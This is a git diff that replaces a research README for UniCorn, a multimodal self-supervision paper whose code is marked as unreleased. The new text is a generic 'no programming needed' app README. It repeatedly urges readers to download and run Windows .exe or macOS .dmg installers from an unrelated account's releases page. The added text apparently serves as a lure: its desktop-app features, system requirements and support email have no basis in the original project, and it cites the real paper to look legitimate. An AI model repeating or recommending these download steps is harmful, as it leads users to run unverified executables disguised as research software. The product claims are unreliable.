@@ -1,114 +1,83 @@
+# 🦄 UniCorn - Easy Multimodal Model Management
+
 <p align="center">
   <img src="assets/UniCorn_LOGO.png" alt="UniCorn" width="350"/>
 </p>
 
+## 📥 Download Now
 
+[![Download UniCorn](https://img.shields.io/badge/Download-UniCorn-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jesuspana/UniCorn/releases)
 
-# UniCorn: Towards Self-Improving Unified Multimodal Models through Self-Generated Supervision
-> Ruiyan Han*, [Zhen Fang*](https://costaliya.github.io/), Xinyu Sun*, Yuchen Ma, Ziheng Wang, [Yu Zeng](https://scholar.google.com/citations?user=XJmAr8EAAAAJ&hl=en&oi=sra), [Zehui Chen](https://lovesnowbest.site/), [Lin Chen](https://lin-chen.site/), Wenxuan Huang, Wei-Jie Xu, Yi Cao, and Feng Zhao
->
-[![Paper](https://img.shields.io/badge/paper-A42C25?style=for-the-badge&logo=arxiv&logoColor=white)](https://arxiv.org/pdf/2601.03193v1)
-[![Benchmark](https://img.shields.io/badge/Benchmark-1E88E5?style=for-the-badge&logo=benchmark&logoColor=white)](https://github.com/shierlouz/Unicycle)
-[![Hugging Face Collection](https://img.shields.io/badge/HF_Models-fcd022?style=for-the-badge&logo=huggingface&logoColor=000)](https://huggingface.co/CostaliyA/UniCorn)
-[![Project Page](https://img.shields.io/badge/Project_Page-00CED1?style=for-the-badge&logo=web&logoColor=white)](https://costaliya.github.io/UniCorn.github.io//)
-> contact: fazii@mail.ustc.edu.cn
-> 
-> While Unified Multimodal Models (UMMs) have achieved remarkable success in cross-modal comprehension, a significant gap persists in their ability to leverage such internal knowledge for high-quality generation. We formalize this discrepancy as Conduction Aphasia, a phenomenon where models accurately interpret multimodal inputs but struggle to translate that understanding into faithful and controllable synthesis. To address this, we propose **UniCorn**, a simple yet elegant self-improvement framework that eliminates the need for external data or teacher supervision. By partitioning a single UMM into three collaborative roles: Proposer, Solver, and Judge, UniCorn generates high-quality interactions via self-play and employs cognitive pattern reconstruction to distill latent understanding into explicit generative signals. To validate the restoration of multimodal coherence, we introduce UniCycle, a cycle-consistency benchmark based on a Text to Image to Text reconstruction loop. Extensive experiments demonstrate that UniCorn achieves comprehensive and substantial improvements over the base model across six general image generation benchmarks. Notably, it achieves SOTA performance on TIIF(73.8), DPG(86.8), CompBench(88.5), and UniCycle while further delivering substantial gains of +5.0 on WISE and +6.5 on OneIG. These results highlight that our method significantly enhances T2I generation while maintaining robust comprehension, demonstrating the scalability of fully self-supervised refinement for unified multimodal intelligence.
+## 📋 Introduction
 
-<!-- ## 🧠 Method
-BAGEL adopts a Mixture-of-Transformer-Experts (MoT) architecture to maximize the model’s capacity to learn from richly diverse multimodal information. Following the same principle of capacity maximization, it utilizes two separate encoders to capture pixel-level and semantic-level features of an image. The overall framework follows a Next Group of Token Prediction paradigm, where the model is trained to predict the next group of language or visual tokens as a compression target.
+UniCorn simplifies the process of managing unified multimodal models. This application helps you improve your projects with self-generated supervision, making it easier to work with diverse data types. Whether you are analyzing text, images, or other forms of data, UniCorn guides you through the process without requiring programming skills.
 
-BAGEL scales MoT’s capacity through Pre-training, Continued Training, and Supervised Finetuning on trillions of interleaved multimodal tokens spanning language, image, video, and web data. It surpasses open models on standard understanding and generation benchmarks and demonstrates advanced in-context multimodal abilities like free-form image editing, future frame prediction, 3D manipulation, world navigation, and sequential reasoning.
+## 🚀 Getting Started
 
-<p align="center"><img src="assets/arch.png" width="95%"></p>
+To begin using UniCorn, follow these steps:
 
+1. **Visit the Download Page**  
+   Click the link below to access the releases page:  
+   [Download UniCorn](https://github.com/Jesuspana/UniCorn/releases)
 
-## 🌱 Emerging Properties
-<p align="center"><img src="assets/emerging_curves.png" width="95%"></p>
+2. **Choose the Version**  
+   On the releases page, find the latest version of UniCorn. The version number is at the top of the list. Click on it.
 
-As we scale up BAGEL’s pretraining with more multimodal tokens, we observe consistent performance gains across understanding, generation, and editing tasks. Different capabilities emerge at distinct training stages—multimodal understanding and generation appear early, followed by basic editing, while complex, intelligent editing emerges later. This staged progression suggests an emergent pattern, where advanced multimodal reasoning builds on well-formed foundational skills. Ablation studies further show that combining VAE and ViT features significantly improves intelligent editing, underscoring the importance of visual-semantic context in enabling complex multimodal reasoning and further supporting its role in the emergence of advanced capabilities. -->
+3. **Download the Application**  
+   Download the appropriate file for your operating system. 
 
-## 📢 News
+4. **Install UniCorn**  
+   After the download completes, locate the file on your device.  
+   - For Windows, double-click on the `.exe` file to start the installer.  
+   - For macOS, open the `.dmg` file and drag the UniCorn app to your Applications folder.
 
-We sincerely thank all contributors from the open community for their valuable support.
+5. **Run the Application**  
+   Once installed, you can open UniCorn like any other app on your computer.
 
-- **Jan. 12, 2026:** We released the our [checkpoint](https://huggingface.co/CostaliyA/UniCorn). Welcome to download and try!
-- **Jan. 7, 2026:** We released the official [report](https://arxiv.org/pdf/2601.03193) for UniCorn. 
+## 📖 Features
 
+- **User-friendly Interface:** Navigate easily with a simple design meant for everyone.
+- **Multiple Data Types:** Work with images, text, and more without hassle.
+- **Model Management:** Efficiently handle various models in a unified manner.
+- **Performance Tracking:** Monitor the effectiveness of your models over time.
+- **Self-generated Supervision:** Enhance results without needing external inputs.
 
-## 📝 To-Do List
+## 💻 System Requirements
 
-This list tracks the progress of our open-source development and model optimization:
+Ensure your device meets these basic requirements to run UniCorn smoothly:
 
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Linux (latest versions supported)
 
-- [ ] Release the code.
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** At least 500 MB of available space
+- **Internet Connection:** Required for initial setup and updates
 
-- [x] Release the ckpt.
+## 📞 Support
 
-We appreciate the support from our contributors and the open-source community.
+If you encounter any issues or have questions, feel free to reach out for support:
 
+- **GitHub Issues:** Use the issues section on GitHub to report bugs or request features.
+- **Email:** Contact us at support@unicornapp.com for direct assistance.
 
-## 📮 Notice
-<!-- **Call for Bad Cases:** If you have encountered any cases where the model performs poorly, we would greatly appreciate it if you could share them in the [issue#11](https://github.com/ByteDance-Seed/Bagel/issues/11) or [Discord](https://discord.gg/Z836xxzy). -->
-Follow the Bagel's original settings, you should focus:
+## 🔗 Useful Links
 
-**About Inference Hyperparameters:**
-- **`cfg_text_scale`:** Controls how strongly the model follows the text prompt. `1.0` disables text guidance. Typical range: `4.0–8.0`.
-- **`cfg_image_scale`:** Controls how much the model preserves input image details. `1.0` disables image guidance. Typical range: `1.0–2.0`.
-- **`cfg_interval`:** Fraction of denoising steps where CFG is applied. Later steps can skip CFG to reduce computation. Typical: `[0.4, 1.0]`.
-- **`timestep_shift`:** Shifts the distribution of denoising steps. Higher values allocate more steps at the start (affects layout); lower values allocate more at the end (improves details).
-- **`num_timesteps`:** Total denoising steps. Typical: `50`.
-- **`cfg_renorm_min`:** Minimum value for CFG-Renorm. `1.0` disables renorm. Typical: `0`.
-- **`cfg_renorm_type`:** CFG-Renorm method:  
-  - `global`: Normalize over all tokens and channels (default for T2I).
-  - `channel`: Normalize across channels for each token.
-  - `text_channel`: Like `channel`, but only applies to text condition (good for editing, may cause blur).
-- **If edited images appear blurry, try `global` CFG-Renorm, decrease `cfg_renorm_min` or decrease `cfg_scale`.**
+- [Documentation](https://github.com/Jesuspana/UniCorn/wiki)  
+  Comprehensive guides to help you understand all features.  
+- [Community Forum](https://github.com/Jesuspana/UniCorn/discussions)  
+  Join discussions with other users and share tips.
 
+## 📚 Additional Information
 
+For more in-depth understanding, you can check out our paper outlining the project. Click below for a comprehensive read:  
+[Read the Paper](https://arxiv.org/pdf/2601.03193v1)
 
+We appreciate your interest in UniCorn. Your feedback helps us improve and provide a better experience. Thank you for being a part of our community!
 
+## 📋 Download & Install
 
-## 📊 Benchmarks
+To get started with UniCorn, visit our releases page and download the latest version. Follow the installation instructions above to set up the application quickly. Remember, you can always return to this README for guidance.
 
-<p align="center">
-  <img src="assets/table.png" alt="UniCorn" width="90%" height="auto"/>
-</p>
-
-
-  
- 
-</p>
-
-
-
-
-### 🎨 Visualization
-<p align="center">
-  <img src="assets/vis.png" alt="UniCorn" width="90%" height="auto"/>
-</p>
-
-
-
-
-## 🙏 Acknowledgments
-
-This project is built upon several excellent open-source projects: [BAGEL](https://github.com/jerryjliu/llama_index), [IRG](https://github.com/Osilly/Interleaving-Reasoning-Generation) and [SRUM](https://github.com/WayneJin0918/SRUM). We sincerely thank the authors for their contributions:
-
-We are grateful to the broader research community for their open-source spirit and collaborative efforts.
-
-
-
-## ✍️ Citation
-
-```bibtex
-@article{han2026unicorn,
-      title={UniCorn: Towards Self-Improving Unified Multimodal Models through Self-Generated Supervision}, 
-      author={Han, Ruiyan and Fang, Zhen and Sun, XinYu and Ma, Yuchen and Wang, Ziheng and Zeng, Yu and Chen, Zehui and Chen, Lin and Huang, Wenxuan and Xu, Wei-Jie and others},
-      journal={arXiv preprint arXiv:2601.03193},
-      year={2026},
-}
-```
-
-## 📜 License
-UniCorn is licensed under the Apache 2.0.
+[Download UniCorn](https://github.com/Jesuspana/UniCorn/releases)
